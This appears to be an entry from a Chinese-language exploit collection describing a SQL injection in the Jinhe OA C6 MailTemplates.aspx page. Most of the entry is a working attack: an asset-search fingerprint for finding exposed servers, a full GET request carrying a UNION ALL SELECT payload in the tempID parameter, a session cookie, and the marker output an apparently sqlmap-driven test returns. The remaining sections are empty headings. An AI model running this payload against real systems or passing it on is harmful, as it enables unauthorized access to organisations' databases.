# 金和OAC6MailTemplates存在SQL注入漏洞

- **系统**：金和OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="金和 OA"`
- **请求**：`GET /C6/JHSoft.Web.Mail/MailTemplates.aspx/?tempID=1+UNION+ALL+SELECT+CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28101%29%2BCHAR%28118%29%2BCHAR%2899%29%2BCHAR%28104%29%2BCHAR%28107%29%2BCHAR%2890%29%2BCHAR%28111%29%2BCHAR%28100%29%2BCHAR%28115%29%2BCHAR%2887`
- **关键头**：`Cookie: ASP.NET_SessionId=4f3tjvzxcv5jafpefj14hsj0; myie=false`　`Content-Length: 0`

**请求体 / payload**
```
qjbzqevchkZodsWbVMmgErqmXVfwhBOWnenovKYGCQJzjqxzqq
sqlmap
/C6/JHSoft.Web.Mail/MailTemplates.aspx/?tempID=1
```

**其他**
- 金和OA C6 MailTemplates存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 金和OA